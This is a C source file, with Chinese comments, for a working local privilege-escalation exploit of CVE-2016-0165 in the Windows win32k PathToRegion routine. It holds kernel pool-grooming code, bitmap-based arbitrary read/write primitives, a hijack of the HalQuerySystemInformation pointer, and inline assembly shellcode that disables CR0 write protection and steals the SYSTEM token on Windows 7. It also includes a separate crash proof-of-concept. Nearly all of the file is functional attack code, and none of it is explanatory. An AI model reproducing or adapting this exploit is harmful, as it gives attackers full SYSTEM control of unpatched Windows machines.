#include "CVE-2016-0165.h"

HBITMAP hBmpHunted = NULL, hBmpExtend = NULL;
DWORD iMemHunted = 0;
PDWORD pBmpHunted = NULL;
CONST LONG iExtHeight = 948;
CONST LONG iExtpScan0 = 951;


BOOL Exploit_CVE_2016_0165()
{
	BOOL bRet = TRUE;
	HDC hdc = NULL;

	hdc = GetDC(NULL);

	if (!hdc)
	{
		ShowError("GetDC", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	if (!Init_CVE_2016_0165(hdc))
	{
		bRet = FALSE;
		goto exit;
	}

	if (!Trigger_CVE_2016_0165(hdc))
	{
		bRet = FALSE;
		goto exit;
	}

	iMemHunted = (pBmpHunted[iExtpScan0] & ~0xFFF) - 0x1000;
	// 修复数据
	if (!xxFixHuntedBitmapObject() || !xxFixHuntedPoolHeader())
	{
		bRet = FALSE;
		goto exit;
	}

	// 获取保存HalQuerySystemInformation函数地址的地址
	PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();
	
	if (!pHalQuerySystemInformation)
	{
		bRet = FALSE;
		goto exit;
	}

	PVOID pTarget = (PVOID)ShellCode_CVE_2016_0165;

	// 将HalQuerySystemInformation函数地址修改为ShellCode地址
	if (!xxPointToHit((ULONG)pHalQuerySystemInformation, 
					  (PVOID)&pTarget,
					  sizeof(PVOID)))
	{
		bRet = FALSE;
		goto exit;
	}

	// 0地址分配内存
	if (!AllocateZeroMemory())
	{
		bRet = FALSE;
		goto exit;
	}
	
	// 调用NtQueryIntervalProfile，执行ShellCode
	if (!CallNtQueryIntervalProfile())
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Trigger_CVE_2016_0165(HDC hdc)
{
	BOOL bRet = TRUE;
	CONST DWORD dwCount = 4000;
	DWORD i = 0;
	HBITMAP hBitMap[dwCount + 5] = { 0 };
	HACCEL hAccel[dwCount + 5] = { 0 };

	// 消耗掉多余0x70的内存空间
	for (i = 0; i < 1000; i++)
	{
		ACCEL accKey[0x0D] = { 0 };
		if (!CreateAcceleratorTableA(accKey, 0x0D))
		{
			ShowError("CreateAcceleratorTableA", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	// 创建BitMap对象
	for (i = 0; i < dwCount; i++)
	{
		// 0xE34 + 0x154 + 0x8 = 0xF90
		hBitMap[i] = CreateBitmap(0xE34, 0x01, 1, 8, NULL);
		if (!hBitMap[i])
		{
			ShowError("CreateBitmap", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	// 用加速表填充保存了BitMap对象的剩余的0x70字节的页
	for (i = 0; i < dwCount; i++)
	{
		ACCEL accKey[0x0D] = { 0 };
		hAccel[i] = CreateAcceleratorTableA(accKey, 0x0D);
		if (!hAccel)
		{
			ShowError("CreateAcceleratorTableA", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	// 释放掉BitMap对象
	for (i = 0; i < dwCount; i++)
	{
		if (!DeleteObject(hBitMap[i]))
		{
			ShowError("DeleteObject", GetLastError());
			bRet = FALSE;
			goto exit;
		}
		hBitMap[i] = NULL;
	}

	// 创建垫片占用释放的BitMap对象中的内存页的起始部分
	for (i = 0; i < dwCount; i++)
	{
		// 0xB5C + 0xC + 0x8 = 0xB70
		if (!CreateClipboard(0xB5C))
		{
			bRet = FALSE;
			goto exit;
		}
	}

	// 重新占用除去垫片以外的内存
	for (i = 0; i < dwCount; i++)
	{
		// 0x1 * 0xB1 * 0x4 + 0x154 + 0x8 = 0x420
		hBitMap[i] = CreateBitmap(0x1, 0xB1, 1, 32, NULL);
		if (!hBitMap[i])
		{
			ShowError("CreateBitmap", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	// 释放掉一部分加速表用来保存触发漏洞时申请的0x70的空间
	for (i = 2000; i < 3000; i++)
	{
		if (!DestroyAcceleratorTable(hAccel[i]))
		{
			ShowError("DestroyAcceleratorTable", GetLastError());
			bRet = FALSE;
			goto exit;
		}
		hAccel[i] = NULL;
	}

	// 触发漏洞
	if (!PathToRegion(hdc))
	{
		ShowError("PathToRegion", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	pBmpHunted = (PDWORD)malloc(0x1000);
	ZeroMemory(pBmpHunted, 0x1000);

	// 获取被漏洞修改的BitMap对象
	for (i = 0; i < dwCount; i++)
	{
		if (GetBitmapBits(hBitMap[i], 0x1000, pBmpHunted) > 0x2D0)
		{
			hBmpHunted = hBitMap[i];
			break;
		}
	}

	if (hBmpHunted == NULL || (pBmpHunted[iExtpScan0] & 0xFFF) != 0x00000CCC)
	{
		printf("Find hBmpHunted Error\n");
		bRet = FALSE;
		goto exit;
	}

	// 设置相邻页的BitMap对象的cy
	if (!xxPoint(iExtHeight, 0xFFFFFFFF))
	{
		bRet = FALSE;
		goto exit;
	}

	// 获取相邻页的BitMap对象的句柄
	PVOID pBmpExtend = malloc(0x1000);
	for (i = 0; i < dwCount; i++)
	{
		if (hBitMap[i] != hBmpHunted && GetBitmapBits(hBitMap[i], 0x1000, pBmpExtend) > 0x2D0)
		{
			hBmpExtend = hBitMap[i];
			break;
		}
	}

	if (hBmpExtend == NULL)
	{
		printf("Find hBmpExtend Error\n");
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL Init_CVE_2016_0165(HDC hdc)
{
	BOOL bRet = TRUE;
	CONST DWORD dwMaxCount = 0x6666667, dwMaxValue = 0x04E2000, dwCount = 0x4B;
	DWORD i = 0;
	PPOINT pPoint = NULL;

	pPoint = (PPOINT)malloc(dwMaxCount * sizeof(POINT));

	if (!pPoint)
	{
		ShowError("malloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	ZeroMemory(pPoint, dwMaxCount * sizeof(POINT));

	for (i = 0; i < dwMaxCount; i++)
	{
		pPoint[i].x = (i % 2) + 1;
		pPoint[i].y = 100;
	}

	for (i = 0; i < dwCount; i++)
	{
		pPoint[i].y = i + 1;
	}

	if (!BeginPath(hdc))
	{
		ShowError("BeginPath", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	for (i = dwMaxCount; i > 0; i -= min(dwMaxValue, i))
	{
		if (!PolylineTo(hdc, &pPoint[dwMaxCount - i], min(dwMaxValue, i)))
		{
			ShowError("PolylineTo", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	if (!EndPath(hdc))
	{
		ShowError("EndPath", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	if (pPoint)
	{
		free(pPoint);
		pPoint = NULL;
	}

	return bRet;
}

BOOL xxPoint(LONG id, DWORD Value)
{
	BOOL bRet = TRUE;

	pBmpHunted[id] = Value;
	if (SetBitmapBits(hBmpHunted, 0x1000, pBmpHunted) < 0x1000)
	{
		ShowError("SetBitmapBits", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return TRUE;
}

BOOL xxPointToHit(LONG addr, PVOID pvBits, DWORD cb)
{
	BOOL bRet = TRUE;
	DWORD dwAddr = 0;
	
	pBmpHunted[iExtpScan0] = addr;
	if (SetBitmapBits(hBmpHunted, 0x1000, pBmpHunted) < 0x1000)
	{
		ShowError("SetBitmapBits", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	if (SetBitmapBits(hBmpExtend, cb, pvBits) < cb)
	{
		ShowError("SetBitmapBits", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL xxPointToGet(LONG addr, PVOID pvBits, DWORD cb)
{
	BOOL bRet = TRUE;

	pBmpHunted[iExtpScan0] = addr;
	if (SetBitmapBits(hBmpHunted, 0x1000, pBmpHunted) < 0x1000)
	{
		ShowError("SetBitmapBits", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	if (GetBitmapBits(hBmpExtend, cb, pvBits) < (LONG)cb)
	{
		ShowError("GetBitmapBits", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL xxFixHuntedPoolHeader()
{
	DWORD szInputBit[0x100] = { 0 };
	CONST LONG iTrueCbdHead = 205;
	CONST LONG iTrueBmpHead = 937;
	BOOL bRet = TRUE;

	szInputBit[0] = pBmpHunted[iTrueCbdHead + 0];
	szInputBit[1] = pBmpHunted[iTrueCbdHead + 1];
	
	if (!xxPointToHit(iMemHunted + 0x000, szInputBit, 0x08))
	{
		bRet = FALSE;
		goto exit;
	}

	szInputBit[0] = pBmpHunted[iTrueBmpHead + 0];
	szInputBit[1] = pBmpHunted[iTrueBmpHead + 1];
	if (!xxPointToHit(iMemHunted + 0xb70, szInputBit, 0x08))
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

BOOL xxFixHuntedBitmapObject()
{
	DWORD szInputBit[0x100] = { 0 };
	BOOL bRet = TRUE;

	szInputBit[0] = (DWORD)hBmpHunted;
	if (!xxPointToHit(iMemHunted + 0xb78, szInputBit, 0x04))
	{
		bRet = FALSE;
		goto exit;
	}

	if (!xxPointToHit(iMemHunted + 0xb8c, szInputBit, 0x04))
	{
		bRet = FALSE;
		goto exit;
	}

exit:
	return bRet;
}

NTSTATUS ShellCode_CVE_2016_0165(ULONG InformationClass, ULONG BufferSize, PVOID Buffer, PULONG ReturnedLength)
{
	// 关闭页保护
	__asm
	{
		cli
		mov eax, cr0
		and eax, ~0x10000
		mov cr0, eax
	}

	__asm
	{
		// 取当前线程
		mov eax, fs:[0x124]
		// 取线程对应的EPROCESS
		mov esi, [eax + 0x150]
		mov eax, esi
	searchWin7 :
		mov eax, [eax + 0xB8]
		sub eax, 0xB8
		mov edx, [eax + 0xB4]
		cmp edx, 0x4
		jne searchWin7
		mov eax, [eax + 0xF8]
		mov [esi + 0xF8], eax
	}

	// 开起页保护
	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
		sti
	}

	return STATUS_SUCCESS;
}

BOOL POC_CVE_2016_0165()
{
	BOOL bRet = TRUE;
	HDC hdc = NULL;
	CONST DWORD dwMaxCount = 0x6666665, dwMaxValue = 0x04E2000, dwCount = 0x100;
	DWORD i = 0;
	PPOINT pPoint = NULL;

	pPoint = (PPOINT)malloc(dwMaxCount * sizeof(POINT));

	if (!pPoint)
	{
		ShowError("malloc", GetLastError());
		bRet = FALSE;
		goto exit;
	}

    ZeroMemory(pPoint, dwMaxCount * sizeof(POINT));
	
	for (i = 0; i < dwCount; i++)
	{
		pPoint[i].y = i;
	}

	hdc = GetDC(NULL);

	if (!hdc)
	{
		ShowError("GetDC", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	if (!BeginPath(hdc))
	{
		ShowError("BeginPath", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	for (i = dwMaxCount; i > 0; i -= min(dwMaxValue, i))
	{
		if (!PolylineTo(hdc, &pPoint[dwMaxCount - i], min(dwMaxValue, i)))
		{
			ShowError("PolylineTo", GetLastError());
			bRet = FALSE;
			goto exit;
		}
	}

	if (!EndPath(hdc))
	{
		ShowError("EndPath", GetLastError());
		bRet = FALSE;
		goto exit;
	}

	if (PathToRegion(hdc) == NULL)
	{
		ShowError("PathToRegion", GetLastError());
		bRet = FALSE;
		goto exit;
	}

exit:
	if (pPoint)
	{
		free(pPoint);
		pPoint = NULL;
	}

	return bRet;
}